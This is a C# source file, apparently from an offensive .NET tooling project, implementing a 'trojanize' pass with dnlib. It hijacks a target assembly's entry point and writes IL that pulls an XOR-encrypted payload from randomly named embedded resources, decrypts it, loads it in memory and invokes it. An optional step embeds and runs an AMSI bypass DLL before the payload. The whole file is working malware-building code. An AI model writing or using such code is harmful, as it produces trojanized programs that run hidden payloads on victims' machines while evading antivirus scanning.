// Trojanize pass — hijacks entry point to load encrypted payload from embedded resources.

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace DotnetWorker;

internal static partial class Program
{
    private static void ApplyTrojanize(
        ModuleDef module, string payloadFile, string keyFile, string? amsiFile)
    {
        var payloadB64 = File.ReadAllText(payloadFile).Trim();
        var keyB64 = File.ReadAllText(keyFile).Trim();

        Console.Error.WriteLine($"  [trojanize] payload size: {payloadB64.Length} chars (base64)");

        // 1. Add encrypted payload and key as embedded resources
        var resourceName = RandomId().TrimStart('_') + ".dat";
        var keyResourceName = RandomId().TrimStart('_') + ".key";
        var amsiResourceName = RandomId().TrimStart('_') + ".bin";

        module.Resources.Add(new EmbeddedResource(resourceName,
            Encoding.UTF8.GetBytes(payloadB64)));
        module.Resources.Add(new EmbeddedResource(keyResourceName,
            Encoding.UTF8.GetBytes(keyB64)));

        // Embed the AMSI bypass DLL as a resource
        byte[]? amsiDllBytes = null;
        if (amsiFile != null)
        {
            var amsiB64 = File.ReadAllText(amsiFile).Trim();
            amsiDllBytes = Convert.FromBase64String(amsiB64);
            module.Resources.Add(new EmbeddedResource(amsiResourceName, amsiDllBytes));
            Console.Error.WriteLine(
                $"  [trojanize] embedded AMSI bypass ({amsiDllBytes.Length} bytes)");
        }

        // 2. Find the entry point
        var entryPoint = module.EntryPoint;
        if (entryPoint == null)
        {
            Console.Error.WriteLine("  [trojanize] warning: no entry point found, skipping");
            return;
        }

        Console.Error.WriteLine($"  [trojanize] hijacking entry point: {entryPoint.FullName}");
        var entryType = entryPoint.DeclaringType;
        var byteArraySig = new SZArraySig(module.CorLibTypes.Byte);
        var objectArraySig = new SZArraySig(module.CorLibTypes.Object);

        // 3. Import all required method references
        var asmRef = module.CorLibTypes.AssemblyRef;
        var typeTypeRef = module.CorLibTypes.GetTypeRef("System", "Type");
        var asmTypeRef = new TypeRefUser(module, "System.Reflection", "Assembly", asmRef);
        var streamTypeRef = new TypeRefUser(module, "System.IO", "Stream", asmRef);
        var srTypeRef = new TypeRefUser(module, "System.IO", "StreamReader", asmRef);
        var trTypeRef = new TypeRefUser(module, "System.IO", "TextReader", asmRef);
        var mbTypeRef = new TypeRefUser(module, "System.Reflection", "MethodBase", asmRef);
        var miTypeRef = new TypeRefUser(module, "System.Reflection", "MethodInfo", asmRef);
        var piTypeRef = new TypeRefUser(module, "System.Reflection", "ParameterInfo", asmRef);
        var convertRef = module.CorLibTypes.GetTypeRef("System", "Convert");

        var asmSig = new ClassSig(asmTypeRef);
        var streamSig = new ClassSig(streamTypeRef);
        var miSig = new ClassSig(miTypeRef);

        var getTypeFromHandle = new MemberRefUser(module, "GetTypeFromHandle",
            MethodSig.CreateStatic(new ClassSig(typeTypeRef),
                new ValueTypeSig(module.CorLibTypes.GetTypeRef("System", "RuntimeTypeHandle"))),
            typeTypeRef);
        var getAssembly = new MemberRefUser(module, "get_Assembly",
            MethodSig.CreateInstance(asmSig), typeTypeRef);
        var getResStream = new MemberRefUser(module, "GetManifestResourceStream",
            MethodSig.CreateInstance(streamSig, module.CorLibTypes.String), asmTypeRef);
        var srCtor = new MemberRefUser(module, ".ctor",
            MethodSig.CreateInstance(module.CorLibTypes.Void, streamSig), srTypeRef);
        var readToEnd = new MemberRefUser(module, "ReadToEnd",
            MethodSig.CreateInstance(module.CorLibTypes.String), trTypeRef);
        var fromBase64 = new MemberRefUser(module, "FromBase64String",
            MethodSig.CreateStatic(byteArraySig, module.CorLibTypes.String), convertRef);
        var asmLoad = new MemberRefUser(module, "Load",
            MethodSig.CreateStatic(asmSig, byteArraySig), asmTypeRef);
        var getEntryPt = new MemberRefUser(module, "get_EntryPoint",
            MethodSig.CreateInstance(miSig), asmTypeRef);
        var getParams = new MemberRefUser(module, "GetParameters",
            MethodSig.CreateInstance(new SZArraySig(new ClassSig(piTypeRef))), mbTypeRef);
        var invoke = new MemberRefUser(module, "Invoke",
            MethodSig.CreateInstance(module.CorLibTypes.Object,
                module.CorLibTypes.Object, objectArraySig), mbTypeRef);

        // 4. Build the loader IL directly in the entry point body
        // Follows the exact pattern from the C# compiler output of LoadPayload()
        entryPoint.Body = new CilBody();
        var body = entryPoint.Body;
        body.InitLocals = true;

        // Locals: string payloadStr, byte[] enc, byte[] key, byte[] plain,
        //         MethodInfo ep, object[] invokeArgs, int i
        body.Variables.Add(new Local(module.CorLibTypes.String));    // 0
        body.Variables.Add(new Local(byteArraySig));                // 1 enc
        body.Variables.Add(new Local(byteArraySig));                // 2 key
        body.Variables.Add(new Local(byteArraySig));                // 3 plain
        body.Variables.Add(new Local(miSig));                       // 4 ep
        body.Variables.Add(new Local(objectArraySig));              // 5 invokeArgs
        body.Variables.Add(new Local(module.CorLibTypes.Int32));     // 6 i

        var I = body.Instructions;

        // var asm = typeof(EntryType).Assembly;
        I.Add(OpCodes.Ldtoken.ToInstruction(entryType));
        I.Add(OpCodes.Call.ToInstruction(getTypeFromHandle));
        I.Add(OpCodes.Callvirt.ToInstruction(getAssembly));

        // payloadStr = new StreamReader(asm.GetManifestResourceStream("name")).ReadToEnd()
        I.Add(OpCodes.Dup.ToInstruction());
        I.Add(OpCodes.Ldstr.ToInstruction(resourceName));
        I.Add(OpCodes.Callvirt.ToInstruction(getResStream));
        I.Add(OpCodes.Newobj.ToInstruction(srCtor));
        I.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
        I.Add(OpCodes.Stloc_0.ToInstruction()); // payloadStr

        // keyStr -> directly call FromBase64String (reuse stack)
        I.Add(OpCodes.Ldstr.ToInstruction(keyResourceName));
        I.Add(OpCodes.Callvirt.ToInstruction(getResStream));
        I.Add(OpCodes.Newobj.ToInstruction(srCtor));
        I.Add(OpCodes.Callvirt.ToInstruction(readToEnd));
        // keyB64 str on stack, decode immediately
        I.Add(OpCodes.Call.ToInstruction(fromBase64));
        I.Add(OpCodes.Stloc_2.ToInstruction()); // key bytes

        // enc = Convert.FromBase64String(payloadStr)
        I.Add(OpCodes.Ldloc_0.ToInstruction());
        I.Add(OpCodes.Call.ToInstruction(fromBase64));
        I.Add(OpCodes.Stloc_1.ToInstruction()); // enc

        // plain = new byte[enc.Length]
        I.Add(OpCodes.Ldloc_1.ToInstruction());
        I.Add(OpCodes.Ldlen.ToInstruction());
        I.Add(OpCodes.Conv_I4.ToInstruction());
        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Byte.TypeDefOrRef));
        I.Add(OpCodes.Stloc_3.ToInstruction());

        // XOR loop
        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[6]));
        var loopCheck = OpCodes.Nop.ToInstruction();
        I.Add(OpCodes.Br.ToInstruction(loopCheck));

        var loopBody = OpCodes.Ldloc_3.ToInstruction(); // plain
        I.Add(loopBody);
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
        I.Add(OpCodes.Ldloc_1.ToInstruction()); // enc
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
        I.Add(OpCodes.Ldelem_U1.ToInstruction());
        I.Add(OpCodes.Ldloc_2.ToInstruction()); // key
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6])); // i
        I.Add(OpCodes.Ldloc_2.ToInstruction()); // key
        I.Add(OpCodes.Ldlen.ToInstruction());
        I.Add(OpCodes.Conv_I4.ToInstruction());
        I.Add(OpCodes.Rem.ToInstruction());
        I.Add(OpCodes.Ldelem_U1.ToInstruction());
        I.Add(OpCodes.Xor.ToInstruction());
        I.Add(OpCodes.Conv_U1.ToInstruction());
        I.Add(OpCodes.Stelem_I1.ToInstruction());
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6]));
        I.Add(OpCodes.Ldc_I4_1.ToInstruction());
        I.Add(OpCodes.Add.ToInstruction());
        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[6]));

        I.Add(loopCheck);
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[6]));
        I.Add(OpCodes.Ldloc_1.ToInstruction());
        I.Add(OpCodes.Ldlen.ToInstruction());
        I.Add(OpCodes.Conv_I4.ToInstruction());
        I.Add(OpCodes.Blt.ToInstruction(loopBody));

        // AMSI bypass: load the bypass DLL from resource, call the patch method
        if (amsiDllBytes != null)
        {
            // We need a few more refs for reading the bypass resource
            var binReaderTypeRef = new TypeRefUser(module, "System.IO", "BinaryReader", asmRef);
            var binReaderCtor = new MemberRefUser(module, ".ctor",
                MethodSig.CreateInstance(module.CorLibTypes.Void, streamSig), binReaderTypeRef);
            var readBytes = new MemberRefUser(module, "ReadBytes",
                MethodSig.CreateInstance(byteArraySig, module.CorLibTypes.Int32),
                binReaderTypeRef);

            // Load bypass assembly from resource:
            // var bypassAsm = Assembly.Load(
            //   new BinaryReader(typeof(X).Assembly.GetManifestResourceStream("name"))
            //     .ReadBytes(size));
            I.Add(OpCodes.Ldtoken.ToInstruction(entryType));
            I.Add(OpCodes.Call.ToInstruction(getTypeFromHandle));
            I.Add(OpCodes.Callvirt.ToInstruction(getAssembly));
            I.Add(OpCodes.Ldstr.ToInstruction(amsiResourceName));
            I.Add(OpCodes.Callvirt.ToInstruction(getResStream));
            I.Add(OpCodes.Newobj.ToInstruction(binReaderCtor));
            I.Add(OpCodes.Ldc_I4.ToInstruction(amsiDllBytes.Length));
            I.Add(OpCodes.Callvirt.ToInstruction(readBytes));
            I.Add(OpCodes.Call.ToInstruction(asmLoad));  // Assembly.Load(byte[])

            // Get the first public type, get its first public static method, invoke it
            // bypassAsm.GetTypes()[0].GetMethods()[0].Invoke(null, null)
            var getTypes = new MemberRefUser(module, "GetTypes",
                MethodSig.CreateInstance(
                    new SZArraySig(new ClassSig(typeTypeRef))),
                asmTypeRef);
            var getMethods = new MemberRefUser(module, "GetMethods",
                MethodSig.CreateInstance(
                    new SZArraySig(miSig)),
                typeTypeRef);

            I.Add(OpCodes.Callvirt.ToInstruction(getTypes));
            I.Add(OpCodes.Ldc_I4_0.ToInstruction());
            I.Add(OpCodes.Ldelem_Ref.ToInstruction());
            I.Add(OpCodes.Callvirt.ToInstruction(getMethods));
            I.Add(OpCodes.Ldc_I4_0.ToInstruction());
            I.Add(OpCodes.Ldelem_Ref.ToInstruction());
            I.Add(OpCodes.Ldnull.ToInstruction());
            I.Add(OpCodes.Ldnull.ToInstruction());
            I.Add(OpCodes.Callvirt.ToInstruction(invoke));
            I.Add(OpCodes.Pop.ToInstruction());

            Console.Error.WriteLine("  [trojanize] AMSI bypass IL injected");
        }

        // var loaded = Assembly.Load(plain); var ep = loaded.EntryPoint;
        I.Add(OpCodes.Ldloc_3.ToInstruction());
        I.Add(OpCodes.Call.ToInstruction(asmLoad));
        I.Add(OpCodes.Callvirt.ToInstruction(getEntryPt));
        I.Add(OpCodes.Stloc.ToInstruction(body.Variables[4]));

        // Build invokeArgs: check if ep has parameters
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[4]));
        I.Add(OpCodes.Callvirt.ToInstruction(getParams));
        I.Add(OpCodes.Ldlen.ToInstruction());

        var hasArgs = OpCodes.Nop.ToInstruction();
        I.Add(OpCodes.Brtrue.ToInstruction(hasArgs));

        // No params path: empty object[]
        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Object.TypeDefOrRef));
        var storeArgs = OpCodes.Stloc.ToInstruction(body.Variables[5]);
        I.Add(OpCodes.Br.ToInstruction(storeArgs));

        // Has params path: new object[] { args }
        I.Add(hasArgs);
        I.Add(OpCodes.Ldc_I4_1.ToInstruction());
        I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.Object.TypeDefOrRef));
        I.Add(OpCodes.Dup.ToInstruction());
        I.Add(OpCodes.Ldc_I4_0.ToInstruction());
        // Load the original args parameter
        if (entryPoint.Parameters.Count > 0)
            I.Add(new Instruction(OpCodes.Ldarg, entryPoint.Parameters[0]));
        else
        {
            I.Add(OpCodes.Ldc_I4_0.ToInstruction());
            I.Add(OpCodes.Newarr.ToInstruction(module.CorLibTypes.String.TypeDefOrRef));
        }
        I.Add(OpCodes.Stelem_Ref.ToInstruction());

        I.Add(storeArgs);

        // ep.Invoke(null, invokeArgs)
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[4]));
        I.Add(OpCodes.Ldnull.ToInstruction());
        I.Add(OpCodes.Ldloc.ToInstruction(body.Variables[5]));
        I.Add(OpCodes.Callvirt.ToInstruction(invoke));
        I.Add(OpCodes.Pop.ToInstruction());

        // If the entry point returns non-void (e.g., int Main), push a default value
        if (entryPoint.ReturnType.FullName != "System.Void")
            I.Add(OpCodes.Ldc_I4_0.ToInstruction());

        I.Add(OpCodes.Ret.ToInstruction());

        body.SimplifyBranches();
        body.OptimizeBranches();
        body.OptimizeMacros();

        Console.Error.WriteLine(
            $"  [trojanize] injected loader into {entryType.Name}.{entryPoint.Name}");
        Console.Error.WriteLine(
            $"  [trojanize] resources: {resourceName}, {keyResourceName}");
    }
}
